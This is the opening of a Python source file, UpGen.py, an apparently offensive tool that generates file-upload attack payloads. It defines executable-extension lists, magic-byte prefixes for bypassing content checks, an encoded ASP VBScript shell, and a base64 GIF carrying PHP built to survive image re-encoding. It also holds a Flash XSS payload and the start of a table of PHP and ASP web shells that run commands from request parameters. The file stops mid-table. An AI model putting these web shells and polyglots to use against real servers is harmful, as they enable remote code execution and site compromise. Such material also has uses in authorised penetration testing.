#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UpGen.py — standalone upload-attack payload generator (sibling of UpMap.py).

Writes upload-attack payload files to disk so you can inspect them or upload
them by hand. Fully self-contained: all payload data and generators live in
this single file (only the Python standard library is required).

Files are written to per-extension subfolders and named:
    <NNNN>_<attacktype>_<handle>.<ext>
  NNNN       4-digit id, resets per extension folder
  attacktype the attack-type / payload-content label (e.g. rce, xss_svg, xxe)
  handle     your handle (default: 0xbugatti)

Selection is by ATTACK TYPE, given as positional args, or the keyword `all`.
Extension (-E) is optional; if omitted, language-dependent types (rce, bypass,
filename) are generated for every backend language.

UpGen makes payload BODIES.  Upname.py makes filename STRINGS.  UpMap.py
delivers both live against a target.

Usage:
  python UpGen.py rce xss -E php -o out/
  python UpGen.py all --handle myname -o out/
  python UpGen.py xxe ssrf                 (all languages, default out dir)
  python UpGen.py xxe --file-read @linux.credentials   (paths.json @key)
"""

import json
import argparse
import base64
import hashlib
import io
import os
import random
import string
import struct
import sys
import zipfile
import zlib

HANDLE_DEFAULT = "0xbugatti"

# Per-tool identity (kept in lockstep with UpMap.TOOL_* / Upname.TOOL_*)
TOOL_NAME    = "UpGen"
TOOL_TAGLINE = "Offline Upload-Attack Payload Generator"
TOOL_VERSION = "1.0"

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────────────────────────────────────────────────────────
# COLORS, PRINT HELPERS, BANNER
# Ported verbatim from UpMap.py so the three tools render identically.
# ─────────────────────────────────────────────────────────────────────────────

# ── ANSI palette ─────────────────────────────────────────────────────────────
R   = "\033[38;5;196m"   # bright red
G   = "\033[38;5;82m"    # matrix green
Y   = "\033[38;5;220m"   # gold / warning
B   = "\033[38;5;39m"    # electric blue
C   = "\033[38;5;51m"    # cyber cyan
M   = "\033[38;5;201m"   # hot magenta  (findings)
W   = "\033[1;97m"       # bold white
DG  = "\033[38;5;240m"   # dim grey
OR  = "\033[38;5;208m"   # orange accent
RS  = "\033[0m"

BLD = "\033[1m"          # bold
DIM = "\033[2m"          # dim

# ── Labelled print helpers ───────────────────────────────────────────────────
def success(msg): print(f"  {G}{BLD}[+]{RS} {W}{msg}{RS}")
def failure(msg): print(f"  {DG}[-]{RS} {DG}{msg}{RS}")
def info(msg):    print(f"  {C}{BLD}[*]{RS} {msg}")
def warn(msg):    print(f"  {Y}{BLD}[!]{RS} {Y}{msg}{RS}")
def err(msg):     print(f"  {R}{BLD}[ERR]{RS} {R}{msg}{RS}")

def section(title):
    """Styled section separator (matches UpMap)."""
    pad = (60 - len(title) - 2) // 2
    print(f"\n  {DG}{'─' * pad}{RS} {C}{BLD}{title}{RS} {DG}{'─' * pad}{RS}")

# 0xBugatti signature logo (cyan dot-art). Verbatim from UpMap.py.
LOGO_ART = [
    "                        ...........",
    "                   .....................",
    "               ..............................",
    "            .....................................",
    "          .......................................:.",
    "        ........................................::::.",
    "      .........................  ...............::::::.",
    "       .........   .     ......   ...............::::::.",
    "            .                      ................::::..",
    "                                   .......................",
    "                                   ..::....................",
    "                                   .:::::::.................",
    ".                                  .::::::::::::............",
    "..                           ..    ::::::::::::::::::.......",
    "..        ...              ..     .::::::::::::::::::.......",
    "..           .:.         .:.       :::::::::::::::::::......",
    "..             .:.      .:         .::::::::::::::::::......",
    " .               .:.  ..:          .::::::::::::::::........",
    " .                .:.  :.          .:::::::::::::::........",
    "                   :...:            .::..:::::::::........",
    "                    .....           .::.....::...........",
    "                   . .. .           ....................",
    "                   . ...            ...................",
    "                     .... .          .................",
    "                     :... ::::.      ...............",
    "                     : .:.00000:.     ............",
    "                  :::: ..:0000000::::::::......",
    "                 :000.  .:0000000000000000:",
    "                        .000000000000:",
    "                           .:00:.",
]

def banner():
    """Print the shared logo + per-tool tagline + version line. Centered to
    the logo's visual width so the three tools (UpMap, UpGen, Upname) print
    identical headers up to the tagline text."""
    print()
    full_w = max(len(r) for r in LOGO_ART)

    def centered(plain, lead="", trail=""):
        pad = max(0, (full_w - len(plain)) // 2)
        return f"  {' ' * pad}{lead}{plain}{trail}"

    for row in LOGO_ART:
        print(f"  {C}{row}{RS}")
    print()

    # Tool name (cyan bold), tagline (white), version line (dim grey + magenta credit).
    print(centered(TOOL_NAME, lead=f"{C}{BLD}", trail=RS))
    print(centered(TOOL_TAGLINE, lead=W, trail=RS))
    print(centered(f"v{TOOL_VERSION}  •  by @0xbugatti",
                   lead=f"{DG}", trail=RS).replace("@0xbugatti",
                                                   f"{RS}{M}{BLD}@0xbugatti{RS}{DG}") + RS)
    print()

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD DATA
# ─────────────────────────────────────────────────────────────────────────────

# Executable extensions per backend language.
# Canonical list — kept union-synchronised with Upname.EXEC_EXTS. When you
# add an extension here, mirror it there (and vice-versa) so the body-side
# (UpGen) and the filename-side (Upname) never disagree on what counts as
# executable for a given backend. Upname stores the same set with a leading
# dot per entry (filename-concat idiom); contents otherwise identical.
EXT = {
    "php":        ["php", "php2", "php3", "php4", "php5", "php6", "php7",
                   "phtml", "phtm", "phar", "pht", "phps", "pgif",
                   "inc", "hphp", "ctp", "module"],
    "asp":        ["asp", "aspx", "asa", "asax", "ashx", "asmx", "aspq",
                   "axd", "cer", "cdx", "config", "cshtm", "cshtml",
                   "rem", "shtml", "soap", "vbhtm", "vbhtml", "xamlx"],
    "jsp":        ["jsp", "jspx", "jsw", "jsv", "jspf", "wss", "do", "action"],
    "coldfusion": ["cfm", "cfml", "cfc", "cfr", "dbm"],
    "perl":       ["pl", "cgi", "perl", "pm", "plx"],
}

# Magic-byte signatures (for polyglots / content-sniff bypass).
MAGIC = {
    "jpg":  b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01",
    "jpeg": b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01",
    "png":  b"\x89PNG\r\n\x1a\n",
    "gif":  b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;",
    "gif87": b"GIF87a\x01\x00\x01\x00\x80\x01\x00\xff\xff\xff\x00\x00\x00,",
    "bmp":  b"BM\x1e\x00\x00\x00\x00\x00\x00\x00",
    "pdf":  b"%PDF-1.4",
    "tiff": b"II*\x00",
    "tif":  b"II*\x00",
    "webp": b"RIFF\x00\x00\x00\x00WEBP",
    "ico":  b"\x00\x00\x01\x00\x01\x00",
    "bpg":  b"BPG\xfb",
    "wav":  b"RIFF\x00\x00\x00\x00WAVE",
    "mp3":  b"ID3",
    "mp4":  b"\x00\x00\x00\x18ftypmp42",
    "psd":  b"8BPS",
    "flif": b"FLIF",
    "jp2":  b"\x00\x00\x00\x0cjP  \r\n\x87\n",
    "pgm":  b"P5\n1 1\n255\n",
    "fits": b"SIMPLE  =                    T",
    "docx": b"PK\x03\x04",
    "xlsx": b"PK\x03\x04",
    "zip":  b"PK\x03\x04",
}

# Binary image/doc headers worth prepending to a shell for content-sniff bypass.
SPOOF_MAGICS = ["jpg", "png", "gif", "gif87", "bmp", "pdf", "tiff", "webp", "ico"]

# Real Windows-Script-Encoder (#@~^…^#~@) encoded VBScript shell (static; fixed
# command param — does not follow --cmd-param). Used by the ASP obfuscation set.
ASP_VBE_BLOB = (b'<%@ LANGUAGE = "VBScript.Encode"%>\r\n'
                b'<%#@~^IQAAAA==3X+^!Y\x7fMVK4msPM+5E\x7f/OcrSl\t[MM+Xrb+AsAAA==^#~@%>')

# Tested GIF whose embedded PHP survives a GD imagecreatefromgif()+imagegif()
# round-trip (sourced from FileUpload-Ideas/CheckThose). Byte-identical to UpMap.
GD_SURVIVOR_GIF = base64.b64decode(
    "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"
)

# Minimal compiled SWF (CWS) calling ExternalInterface.call("alert","XSS") — a real
# ~206-byte Flash XSS payload (UploadScanner SWF_TYPES). Byte-identical to UpMap.
try:
    SWF_XSS = base64.b64decode(
        "Q1dTDmkGAAB4AWVU3VLbRhTe1dqW/2UDMeBAozQ0jgm2ZMMwgyGeUgwZbiATXyTDoPEs"
        "0gorkbUaScZmOpm+SSe96Wv0AXLjXrQP0KvO9KLuE6QriSBMNKOfPec7335nzzkag9hf"
        "AOR/BWAJgk5xGQDw0/wnCMCeo+mt150jcTwwLbfFVi8qfc+zW5I0Go3qo806dS6lxs7O"
        "jiQ3pWazxhA199ry8LhmuU8q7YCgQ1zVMWzPoJboE+ILOvReVCo3rJp6S2oPHTOg1FSJ"
        "mGRALM+VGvUGI9LUlk6dAfba2LZNQ8U+nTSuuX2qvh/hK1LTTez296QI6Md4hmeS9r5G"
        "L4h4ZJKxuCXuR/EBOoT4YC0S2r6TJvaj6yodSLZDtaHKNOmMKgi+G+JT2MML03D7xGk"
        "PrfcWHVkBKrL6GNUh2KOziC82329i63KIL0n78CSIvl0HGrFH2if0SmzIG2JTbjRDGb5"
        "1T/JP985p31hYAdsgXxgun5zWXu13u29OX3fARGBVnrk6hb/RHjjgPn/+fJZGzJVgdyz"
        "xy1mIyuCf/2mxnviUftvtvnLoO6J64LeFbAwAZgV3jAVQ90Oe3wUqB63zDlWHQUlFbGl"
        "il3ieYV265/vawLAM13P8Q2GrsFSsluIPQ8PUiCNu1bfPI/5z11F3d6N1HbvZaLUmJ7tE"
        "HTqGd50NOqLuXrseGcD1DDZNOurQATas4uHYI46FzWOLvXWsknwIJjf2uQF23D6LOByr"
        "JGhdV5Crux9Y36n9Z6T644fdmEOplzYpZhKPLZ2mbezgAWF8LvfOFSJJTOCa/PimoaJm"
        "2u9uSk1Z3pYuWJrsKBZCBZrh2ia+bnVtlgNZmzV2QufphX/6B5QNmmER59EsKMgJq55x"
        "RULgw1n/DMlK6CNX/qy1Dv2X7/fTJA4nSTGVHUL80HGoA0mcFUklD6LUpOgzN7NJIpSf"
        "CAUI93hvKhNumpvRU/xKfWnGf5v0Sq93SXse7amsbXoa0VkT+f+EXp+YNrKpixrbm4tf"
        "QPf9jcZWMQ5LiRJXSseLi1xybgmWYXm+vFB+UC6VF0vflL7lchDF4gk+mUpnsrn8As/F"
        "eZTkYykeZXiU41GeR0KqAHm0zKMyjx7yaIVHkBce8UjkC4954QkvrPHCd2yYODYQq+zB"
        "Ae4prDyrwso6zOVTyWB2IAdzHch8EAEIkyk0kV+yqUIoLfT/Q9PkRH6z/of8L4yB5DQ1"
        "OQbTtAJ1uMEfcbA6zShIR09xbJr3PzaySlyP6wmd15MfN5Y+HqUYRCisADCRf5fPwPqf"
        "6/LzAZwWlCzhTHiUhdXVJDedewmrB8fpDOA4JmBnIrNtEwQogi7ISkEvyEpRL8rKnD4n"
        "K/P6vKzk9XzweAtWg6ufYxFxplqYv/c3+J5l/j9Txem0"
    )
except Exception:
    SWF_XSS = b"CWS" + b"\x00" * 20   # fallback minimal SWF header


# Shells per language: (content_bytes, [extensions], content_label).
def _shells():
    php_e, asp_e, jsp_e, cf_e = EXT["php"], EXT["asp"], EXT["jsp"], EXT["coldfusion"]
    return {
        "php": [
            (b"<?php system($_GET['cmd']); ?>",            php_e, "rce"),
            (b"<?php passthru($_GET['cmd']); ?>",          php_e, "rce"),
            (b"<?php echo shell_exec($_GET['cmd']); ?>",   php_e, "rce"),
            (b"<?php $f='sys'.'tem';$f($_GET['cmd']); ?>", php_e, "rce_obfuscated"),
            (b"<?php eval($_POST['c']); ?>",               php_e, "rce_eval_post"),
            (b"<?=`$_GET[0]`?>",                           php_e, "rce"),
        ],
        "asp": [
            (b'<% Response.Write(CreateObject("WScript.Shell").Exec('
             b'Request.QueryString("cmd")).StdOut.ReadAll()) %>',     asp_e, "rce"),
            (b'<%@ Page Language="C#" %><% System.Diagnostics.Process'
